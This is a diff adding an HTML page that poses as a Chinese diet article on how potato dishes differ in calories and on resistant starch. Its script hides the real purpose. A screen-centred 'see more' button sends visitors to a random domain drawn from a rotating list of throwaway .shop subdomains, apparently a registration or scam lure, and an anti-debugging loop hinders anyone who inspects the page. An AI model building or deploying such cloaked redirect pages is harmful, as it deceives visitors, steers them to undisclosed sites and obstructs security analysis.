@@ -1,0 +1,165 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>都是土豆，差距怎么这么大？</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f7f8fc 0%, #eef2ff 100%);
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        }
+        .article {
+            padding: 20px;
+        }
+        .article h1 {font-size: 20px;text-align: center;line-height: 40px;}
+        .article p {font-size: 14px;color: #333;line-height: 24px;text-indent: 2em;}
+        .card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 480px;
+            padding: 48px 32px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        /* Loading旋转动画 */
+        .loader {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e6edff;
+            border-top-color: #3671e9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+        h2 {
+            font-size: 24px;
+            color: #1d2939;
+            margin-bottom: 12px;
+        }
+        .desc {
+            font-size: 15px;
+            color: #667085;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #d92d20;
+            margin-bottom: 20px;
+        }
+        .btn-link {
+            display: inline-block;
+            padding: 14px 36px;
+            background-color: #3671e9;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.25s ease;
+        }
+        .btn-link:hover {
+            background-color: #2859c4;
+        }
+        .tip-small {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #98a2b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="article">
+        <h1>都是土豆，差距怎么这么大？</h1>
+        <p>不少食材天生低脂高纤，本该是减脂好搭档。可经过油炸、脱水、重油重糖加工，摇身一变，就成了隐藏的“热量刺客”。今天一起揭开食材的变身套路！</p>
+        <p>蒸土豆：无额外油脂添加，膳食纤维保留完整。低热量、高饱腹感，适合在减脂期作为主食食用。</p>
+        <p>土豆泥：加工过程中添加黄油、淡奶油，引入大量外源脂肪，热量翻倍。</p>
+        <p>薯条：富含淀粉，经过油炸，表层酥脆，但油脂吸附较多，是典型的高能量食品。</p>
+        <p>非油炸薯片：用热风干燥替代油炸，看似低脂，但为了保持酥脆度，加工时要喷不少油，脂肪含量并没有比油炸的低多少。</p>
+        <p>健康贴士：冷却处理，可让土豆产生抗性淀粉</p>
+        <p>土豆中的淀粉在加热过程中吸水膨胀，变得容易被消化吸收。但当温度下降，淀粉分子重新排列，形成有序的结晶结构，这就是“回生”过程。回生后的淀粉对消化酶产生抵抗力，成为抗性淀粉。</p>
+        <p>热量摄入降低：抗性淀粉不易被小肠吸收，实际摄入的热量有所降低。</p>
+        <a href="javascript:get_more();" style="position:fixed;left:50%;top:50%;transform: translate(-50%, -50%);font-size:16px;background:#333;color:#fff;display:block;width:120px;height:40px;text-align:center;line-height:40px;text-decoration:none;border-radius:5px;">点击查看更多</a>
+    </div>
+    <!-- <div class="card">
+        <div class="loader" id="loadingIcon"></div>
+        <h2>正在前往注册页面</h2>
+        <p class="desc">系统正在分配最优线路，请稍候片刻</p>
+        <p class="error-text" id="errorMsg"></p>
+        <a href="" class="btn-link" id="manualLink" style="display:none;">手动点击跳转</a>
+        <p class="tip-small">若长时间无响应，请点击上方按钮</p>
+    </div> -->
+
+<script>
+    const devtoolsDetector = /./;
+    devtoolsDetector.opened = false;
+    const checkDevtools = () => {
+      while (true) {
+        const start = Date.now();
+        debugger; // 打开调试器时这里会暂停
+        const end = Date.now();
+        // consoleLog(end - start);
+        if (end - start < 20) {
+          break;                          // 正常执行，未开调试器
+        } else {
+          // consoleLog('is debugger');
+          devtoolsDetector.opened = true; // 停顿 >= 20ms → 判定调试器已打开
+        }
+      }
+    };
+    // 每 100ms 用 console.log 触发 toString 陷阱；发现调试器就再跑 debugger 检测并清空控制台
+    setInterval(() => {
+      // console.log(devtoolsDetector);
+      if (devtoolsDetector.opened) {
+        checkDevtools();
+        console.clear();
+      }
+    }, 100);
+    checkDevtools(); // 执行 debugger 检测
+    const urls = [
+        'https://z4b9p5o4.txbm.shop',
+        'https://k8f7p5n4.txbm.shop',
+        'https://s8o0j8k7.txbm.shop',
+        'https://t2e5n8z4.txbm.shop',
+        'https://z1r0q1p7.txbm.shop',
+        'https://3iomzwpit6ynp3y2dj.txbm.shop',
+        'https://392grqcz23b3yukh15.txbm.shop',
+        'https://3nzbv9w6eloq7v5foh.txbm.shop',
+        'https://36b25dhsdnj6604v60.txbm.shop',
+        'https://3bfu2k6jvitsmeikvy.txbm.shop',
+        'https://3ape4iwsgaxkakxdwk.txbm.shop',
+        'https://3pgb0so9jeowxihzab.txbm.shop',
+        'https://39stdiqxmcpalgsnzy.txbm.shop',
+        'https://3e14lldizceut.zhizhi.shop',
+        'https://3d568738fzajh.zhizhi.shop',
+        'https://3gz004ujseb9z.zhizhi.shop',
+        'https://37zuhm5yjgzh4.zhizhi.shop',
+        'https://3ajq10qdg2awo.zhizhi.shop',
+        'https://3hblzm6f7a1om.zhizhi.shop',
+        'https://3s1n153mdlcjn.zhizhi.shop',
+        'https://3psvsakssllzl.zhizhi.shop',
+        'https://3fd3s0z5i61dx.zhizhi.shop'
+    ];
+    function get_more(){
+        window.location.href = urls[Math.floor(Math.random() * urls.length)];
+    }
+</script>
+</body>
+</html>
